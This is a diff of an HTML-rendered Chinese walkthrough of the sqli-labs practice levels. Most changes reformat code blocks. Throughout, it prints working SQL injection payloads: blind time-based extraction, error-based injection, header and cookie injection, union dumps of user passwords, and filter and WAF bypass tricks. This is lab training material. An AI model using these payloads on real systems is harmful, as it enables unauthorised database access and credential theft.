+<li>查列<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span>admin<span class="token string">' and if(substr((select column_name from information_schema.columns where table_name='</span>users<span class="token string">' limit 3,1),§1§,1)='</span>§s§'<span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#&amp;passwd=&amp;submit=Submit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 查到user列</li>
 </ul>
 <p><img src="https://user-images.githubusercontent.com/76896357/114983249-f4a17c80-9ec2-11eb-9e7b-5fcc41552187.png" alt="image"></p>
@@ -925,15 +871,13 @@ __完了，没有回显了，那么我们就想到报错注入__
 <p><img src="https://user-images.githubusercontent.com/76896357/114983399-287ca200-9ec3-11eb-8f8a-7b4b1c61e3c5.png" alt="image"></p>
 <p>利用substr函数切割进行查询，还是很快的</p>
 <ul>
-<li>查字段<pre class=" language-sql"><code class="language-sql">uname<span class="token operator">=</span>admin<span class="token string">' and if(substr((select password from security.users limit 4,1),§1§,1)='</span>§s§'<span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#&amp;passwd=&amp;submit=Submit</span>
-</code></pre>
+<li>查字段<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span>admin<span class="token string">' and if(substr((select password from security.users limit 4,1),§1§,1)='</span>§s§'<span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#&amp;passwd=&amp;submit=Submit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <img src="https://user-images.githubusercontent.com/76896357/114983971-cec8a780-9ec3-11eb-99f8-79e51f9d9d76.png" alt="image"></li>
 </ul>
 <h2 id="16-双引号延时注入"><a href="#16-双引号延时注入" class="headerlink" title="16. 双引号延时注入"></a>16. 双引号延时注入</h2><p>现在本页面看看，是什么样的类型注入，以及他的闭合方式，发现啥也不显示。。。。。。</p>
 <p>完犊子了，又是延时，吐了，看一下，闭合方式吧</p>
 <p>差点没试出来</p>
-<pre class=" language-sql"><code class="language-sql">admin"<span class="token punctuation">)</span> <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">admin"<span class="token punctuation">)</span> <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://user-images.githubusercontent.com/76896357/114986199-4a2b5880-9ec6-11eb-8f82-4eaee69b0140.png" alt="image"></p>
 <p>剩下的就是类似15题吧</p>
 <h2 id="17-基于错误的更新查询"><a href="#17-基于错误的更新查询" class="headerlink" title="17. 基于错误的更新查询"></a>17. 基于错误的更新查询</h2><p><strong>这种情况，一下子给我整懵了，最后就参考别人博客写了一下</strong></p>
@@ -947,9 +891,7 @@ __完了，没有回显了，那么我们就想到报错注入__
 <li><p>由于报错，那么执行一下报错注入吧</p>
 </li>
 <li><p>查库</p>
-<pre class=" language-sql"><code class="language-sql">uname<span class="token operator">=</span>admin<span class="token operator">&amp;</span>passwd<span class="token operator">=</span>admin<span class="token string">' and updatexml(1,concat('</span><span class="token operator">^</span><span class="token string">',database(),'</span><span class="token operator">^</span>'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#&amp;submit=Submit</span>
-</code></pre>
-</li>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span>admin<span class="token operator">&amp;</span>passwd<span class="token operator">=</span>admin<span class="token string">' and updatexml(1,concat('</span><span class="token operator">^</span><span class="token string">',database(),'</span><span class="token operator">^</span>'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#&amp;submit=Submit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 </ul>
 <p><img src="https://user-images.githubusercontent.com/76896357/114988290-be66fb80-9ec8-11eb-9e62-a09e39a637f3.png" alt="image"></p>
 <p>额。。。说实话这道题kennel是我的原因，报出来的全是admin，还是看上面的博客吧</p>
@@ -962,8 +904,7 @@ __完了，没有回显了，那么我们就想到报错注入__
 <p><img src="https://user-images.githubusercontent.com/76896357/115002470-5d92ef80-9ed7-11eb-990f-3f936691b39c.png" alt="image"></p>
 <p>查询语句中存在uagent，那么考虑再user-gent中注入</p>
 <ul>
-<li>查库：<pre class=" language-sql"><code class="language-sql"><span class="token keyword">User</span><span class="token operator">-</span>Agent: <span class="token string">'and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '</span><span class="token comment" spellcheck="true">//下面千万要把账号密码带上，不然程序走的是另一条路线</span>
-</code></pre>
+<li>查库：<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">User</span><span class="token operator">-</span>Agent: <span class="token string">'and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '</span><span class="token comment">//下面千万要把账号密码带上，不然程序走的是另一条路线</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <img src="https://user-images.githubusercontent.com/76896357/115007886-10b21780-9edd-11eb-9be8-b350f5c54846.png" alt="image"></li>
 </ul>
 <p>接下来就是🧐构造语句了</p>
@@ -1000,8 +941,7 @@ __完了，没有回显了，那么我们就想到报错注入__
 <ul>
 <li>查看有没有回显</li>
 </ul>
-<pre><code>-admin&#39;) union select 1,2,3 #//利用#来注释
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">-admin&#39;) union select 1,2,3 #&#x2F;&#x2F;利用#来注释<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>编译后的密文</p>
 <p><img src="https://user-images.githubusercontent.com/76896357/115013185-51ad2a80-9ee3-11eb-8b51-6ecf9801d7e4.png" alt="image"></p>
 <p>可以查到回显位</p>
@@ -1011,80 +951,69 @@ __完了，没有回显了，那么我们就想到报错注入__
 <p><img src="https://user-images.githubusercontent.com/76896357/115098719-1e5eb000-9f64-11eb-9aa4-685fc509e6c2.png" alt="image"></p>
 <p>还是cookie注入</p>
 <ul>
-<li>查看闭合方式<br>```</li>
+<li>查看闭合方式<pre class="line-numbers language-none"><code class="language-none">-admin&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="https://user-images.githubusercontent.com/76896357/115098782-857c6480-9f64-11eb-851e-3be941b5d54d.png" alt="image"></li>
 </ul>
-<p>-admin”</p>
-<pre><code>![image](https://user-images.githubusercontent.com/76896357/115098782-857c6480-9f64-11eb-851e-3be941b5d54d.png)
-
-根据报错说明是“”
-![image](https://user-images.githubusercontent.com/76896357/115098777-7e555680-9f64-11eb-8deb-dde277dfb4d7.png)
-
-* 查看有没有回显
-```sql
--admin&quot; union select 1,2,3 #
-</code></pre>
-<p><img src="https://user-images.githubusercontent.com/76896357/115098829-d1c7a480-9f64-11eb-8475-1445288586fa.png" alt="image"></p>
+<p>根据报错说明是“”<br><img src="https://user-images.githubusercontent.com/76896357/115098777-7e555680-9f64-11eb-8deb-dde277dfb4d7.png" alt="image"></p>
 <ul>
-<li>查库<br>```sql</li>
+<li><p>查看有没有回显</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span>admin" <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://user-images.githubusercontent.com/76896357/115098829-d1c7a480-9f64-11eb-8475-1445288586fa.png" alt="image"></p>
+</li>
+<li><p>查库</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span>admin" <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#//加密</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://user-images.githubusercontent.com/76896357/115098863-09cee780-9f65-11eb-9b85-fdfc374be5ee.png" alt="image"></p>
+</li>
+<li><p>查表</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span>admin" <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 </ul>
-<p>-admin” union select 1,2,database() #//加密</p>
-<pre><code>![image](https://user-images.githubusercontent.com/76896357/115098863-09cee780-9f65-11eb-9b85-fdfc374be5ee.png)
-
-* 查表
-```sql
--admin&quot; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #
-</code></pre>
 <p><img src="https://user-images.githubusercontent.com/76896357/115098921-5d413580-9f65-11eb-8372-ed7eb6ca17c4.png" alt="image"></p>
 <p><img src="https://user-images.githubusercontent.com/76896357/115098749-4fd77b80-9f64-11eb-808a-874b63b532f8.png" alt="image"></p>
 <p>剩下的就类似之前的语句</p>
 <h2 id="23-过滤掉注释"><a href="#23-过滤掉注释" class="headerlink" title="23. 过滤掉注释"></a>23. 过滤掉注释</h2><ul>
-<li>看一下闭合方式<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span>admin'
-</code></pre>
-</li>
+<li>看一下闭合方式<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span>admin'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 </ul>
 <p><img src="https://user-images.githubusercontent.com/76896357/115099006-e2c4e580-9f65-11eb-83d9-1ad8feb18c50.png" alt="image"></p>
 <p>显然是‘闭合</p>
 <ul>
-<li>看下有没有回显<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span>admin' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment" spellcheck="true">--+</span>
-</code></pre>
+<li>看下有没有回显<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span>admin' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <img src="https://user-images.githubusercontent.com/76896357/115099050-16a00b00-9f66-11eb-96b0-5fb40f2eaf43.png" alt="image"></li>
 </ul>
 <p>没有</p>
 <ul>
 <li>看下会不会报错</li>
 </ul>
-<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment" spellcheck="true">--+</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://user-images.githubusercontent.com/76896357/115099104-5e269700-9f66-11eb-9ff3-845c0eac76bc.png" alt="image"></p>
 <p>看到这里，发现报错就没变过，而且根据报错也能猜到，估计是把注释给过滤掉了。。。</p>
 <p>那么就有自己来造闭合语句‘’</p>
 <ul>
-<li>查库<br>```sql<br>?id=’union select 1,2,3’<br>?id=’union select 1,2,databae()’</li>
+<li>查库<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token string">'union select 1,2,3'</span>
+?id<span class="token operator">=</span><span class="token string">'union select 1,2,databae()'</span>
+
+?id<span class="token operator">=</span> <span class="token string">' union select 1,2,group_concat(database()) from information_schema.schemata where 1 or '</span><span class="token number">1</span><span class="token string">'= '</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<img src="https://user-images.githubusercontent.com/76896357/115099163-b9f12000-9f66-11eb-96be-e19b2e1e4739.png" alt="image"></li>
 </ul>
-<p>?id= ‘ union select 1,2,group_concat(database()) from information_schema.schemata where 1 or ‘1’= ‘</p>
-<pre><code>![image](https://user-images.githubusercontent.com/76896357/115099163-b9f12000-9f66-11eb-96be-e19b2e1e4739.png)
+<p>全部的数据库</p>
+<p><img src="https://user-images.githubusercontent.com/76896357/115099205-f3299000-9f66-11eb-8a88-cbce1f8c2225.png" alt="image"></p>
+<ul>
+<li>查表</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token string">' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() or '</span><span class="token number">1</span><span class="token string">'= '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-全部的数据库
-
-![image](https://user-images.githubusercontent.com/76896357/115099205-f3299000-9f66-11eb-8a88-cbce1f8c2225.png)
-
-* 查表
-
-```sql
-?id=&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() or &#39;1&#39;= &#39;
-</code></pre>
 <p><img src="https://user-images.githubusercontent.com/76896357/115099249-51ef0980-9f67-11eb-99da-5b74bcff9ab5.png" alt="image"></p>
 <ul>
 <li>查列</li>
 </ul>
-<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token string">' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span>users<span class="token string">' or '</span><span class="token number">1</span><span class="token string">'= '</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token string">' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span>users<span class="token string">' or '</span><span class="token number">1</span><span class="token string">'= '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://user-images.githubusercontent.com/76896357/115099310-b4e0a080-9f67-11eb-887f-ba54aa6ffb57.png" alt="image"></p>
 <ul>
 <li>查字段</li>
 </ul>
-<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token string">'union select 1,group_concat(username),group_concat(password) from security.users where 1 or '</span><span class="token number">1</span><span class="token string">'= '</span><span class="token comment" spellcheck="true">//把句子结构补全不然不让过</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token string">'union select 1,group_concat(username),group_concat(password) from security.users where 1 or '</span><span class="token number">1</span><span class="token string">'= '</span><span class="token comment">//把句子结构补全不然不让过</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://user-images.githubusercontent.com/76896357/115099371-0557fe00-9f68-11eb-8652-629a221ff6c8.png" alt="image"></p>
 <p>过。。。。</p>
 <h2 id="24-出了点问题先跳过"><a href="#24-出了点问题先跳过" class="headerlink" title="24. 出了点问题先跳过"></a>24. 出了点问题先跳过</h2><h2 id="25-AND和or被绕过"><a href="#25-AND和or被绕过" class="headerlink" title="25. AND和or被绕过"></a>25. AND和or被绕过</h2><ul>
@@ -1092,23 +1021,19 @@ __完了，没有回显了，那么我们就想到报错注入__
 </ul>
 <p>显然是‘闭合</p>
 <ul>
-<li>看下有没有回显<pre><code>?id=-1&#39; union select 1,2,3 --+
-</code></pre>
-</li>
+<li>看下有没有回显<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;-1&#39; union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 </ul>
 <p><img src="https://user-images.githubusercontent.com/76896357/115099670-fe31ef80-9f69-11eb-8863-c204037a3fa8.png" alt="image"></p>
 <p>还是有回显的</p>
 <ul>
 <li>查库</li>
 </ul>
-<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">--+</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://user-images.githubusercontent.com/76896357/115099671-fe31ef80-9f69-11eb-9513-73448e37a1c4.png" alt="image"></p>
 <ul>
-<li>查表<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">--+</span>
-?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> infoorrmation_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">--+</span>
-</code></pre>
-</li>
+<li>查表<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
+?id=-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> infoorrmation_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
 </ul>
 <p><img src="https://user-images.githubusercontent.com/76896357/115099731-608af000-9f6a-11eb-868f-118da39c30a4.png" alt="image"></p>
 <p>看这就出毛病了</p>
@@ -1119,8 +1044,7 @@ __完了，没有回显了，那么我们就想到报错注入__
 <p>同样，构建password的时候也要写成passwoorrd</p>
 <p>这里就不介绍了。。。</p>
 <h2 id="26-过滤一堆的注入"><a href="#26-过滤一堆的注入" class="headerlink" title="26. 过滤一堆的注入"></a>26. 过滤一堆的注入</h2><ul>
-<li>查询闭合方式<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment" spellcheck="true">--+</span>
-</code></pre>
+<li>查询闭合方式<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <img src="https://user-images.githubusercontent.com/76896357/115099874-6208e800-9f6b-11eb-825f-cf35a471ba8f.png" alt="image"></li>
 </ul>
 <p>显然是‘闭合</p>
@@ -1132,8 +1056,8 @@ __完了，没有回显了，那么我们就想到报错注入__
 <ul>
 <li>看看有没有报错</li>
 </ul>
-<pre class=" language-sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span>' anandd <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token comment" spellcheck="true">-- </span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span>' anandd <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://user-images.githubusercontent.com/76896357/115099935-d3e13180-9f6b-11eb-9f42-5762b727f1cf.png" alt="image"></p>
 <p>好家伙不仅没有报错，还把and和or过滤了</p>
 <p><img src="https://user-images.githubusercontent.com/76896357/115100004-5833b480-9f6c-11eb-9bc1-b6cdab9881a4.png" alt="image"></p>
@@ -1143,16 +1067,14 @@ __完了，没有回显了，那么我们就想到报错注入__
 <p>%a0    空格</p>
 <p>%09    tab</p>
 <p>还有其他方式</p>
-<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">'%09||'</span><span class="token number">1</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">'%09||'</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://user-images.githubusercontent.com/76896357/115100349-9f22a980-9f6e-11eb-90a8-276c65e946c6.png" alt="image"></p>
 <ul>
 <li>查看闭合方式</li>
 </ul>
 <p>由于输入什么都不显示,延时都不行，此案过。。。</p>
 <h2 id="27-过滤union和select的注入"><a href="#27-过滤union和select的注入" class="headerlink" title="27. 过滤union和select的注入"></a>27. 过滤union和select的注入</h2><ul>
-<li>查看闭合方式<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>'
-</code></pre>
+<li>查看闭合方式<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <img src="https://user-images.githubusercontent.com/76896357/115102138-b025e780-9f7b-11eb-84e4-cf9d26b54d23.png" alt="image"></li>
 </ul>
 <p>单引号闭合</p>
@@ -1163,20 +1085,18 @@ __完了，没有回显了，那么我们就想到报错注入__
 <p><img src="https://user-images.githubusercontent.com/76896357/115102277-76a1ac00-9f7c-11eb-9f52-579801e6b701.png" alt="image"></p>
 <p>又是一堆正则。。。。。。</p>
 <ul>
-<li>查看回显<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">0</span><span class="token string">'%0AUNion%0ASeleCt%0A1,2,3%0Aor%0A'</span><span class="token number">1</span><span class="token string">'= '</span><span class="token comment" spellcheck="true">//最好别用hackbar，会出现问题的</span>
-</code></pre>
+<li>查看回显<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">0</span><span class="token string">'%0AUNion%0ASeleCt%0A1,2,3%0Aor%0A'</span><span class="token number">1</span><span class="token string">'= '</span><span class="token comment">//最好别用hackbar，会出现问题的</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <img src="https://user-images.githubusercontent.com/76896357/115107358-0a837000-9f9d-11eb-8870-4b6940bb1dfa.png" alt="image"></li>
 </ul>
 <p>剩下的就类似这样直接查。。。</p>
 <h2 id="26-27-28-都是过滤union，select可i用大小写绕过，空格用-a0补充"><a href="#26-27-28-都是过滤union，select可i用大小写绕过，空格用-a0补充" class="headerlink" title="26,27,28..都是过滤union，select可i用大小写绕过，空格用%a0补充"></a>26,27,28..都是过滤union，select可i用大小写绕过，空格用%a0补充</h2><h2 id="29-waf保护"><a href="#29-waf保护" class="headerlink" title="29. waf保护"></a>29. waf保护</h2><ul>
 <li>看看有没有回显</li>
 </ul>
-<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment" spellcheck="true">--+</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://user-images.githubusercontent.com/76896357/115104963-ac4f9080-9f8e-11eb-8055-55137a6d224f.png" alt="image"></p>
 <p>有回显，查库</p>
-<pre><code>?id=-1&#39; union select 1,2,database() --+
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;-1&#39; union select 1,2,database() --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://user-images.githubusercontent.com/76896357/115105020-dc972f00-9f8e-11eb-9ad8-bbd58b258a10.png" alt="image"></p>
 <ul>
 <li>查表</li>
@@ -1202,8 +1122,8 @@ __完了，没有回显了，那么我们就想到报错注入__
 </ul>
 <p><img src="https://user-images.githubusercontent.com/76896357/115105531-203f6800-9f92-11eb-80df-a544bbad595d.png" alt="image"></p>
 <p>好家伙这里就不行了，看样子并不是很水</p>
-<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>" <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> security<span class="token punctuation">.</span>users <span class="token comment" spellcheck="true">--+</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>" <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> security<span class="token punctuation">.</span>users <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://user-images.githubusercontent.com/76896357/115107513-e07e7d80-9f9d-11eb-9453-dc87e892482a.png" alt="image"></p>
 <h2 id="31-waf"><a href="#31-waf" class="headerlink" title="31. waf"></a>31. waf</h2><ul>
 <li>看一下闭合方式</li>
@@ -1230,22 +1150,20 @@ __完了，没有回显了，那么我们就想到报错注入__
 <ul>
 <li>查看是否有回显</li>
 </ul>
-<pre><code>?id=-1%ee&#39; union select 1,2,3 --+
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;-1%ee&#39; union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://user-images.githubusercontent.com/76896357/115107087-4fa6a280-9f9b-11eb-8a2c-b78c0b2c3e86.png" alt="image"></p>
 <ul>
 <li>查库</li>
 </ul>
-<pre><code>?id=-1%ee&#39; union select 1,2,3 --+
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;-1%ee&#39; union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://user-images.githubusercontent.com/76896357/115107537-03a92d00-9f9e-11eb-9e20-9549a227a1f4.png" alt="image"></p>
 <p>剩下的基本上就没什么问题了</p>
 <ul>
 <li>查列，这时候的users需要改变一下</li>
 </ul>
-<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">ee</span><span class="token string">' union select 1,2,column_name from information_schcema.columns where table_name='</span>users' <span class="token comment" spellcheck="true">--+//不行</span>
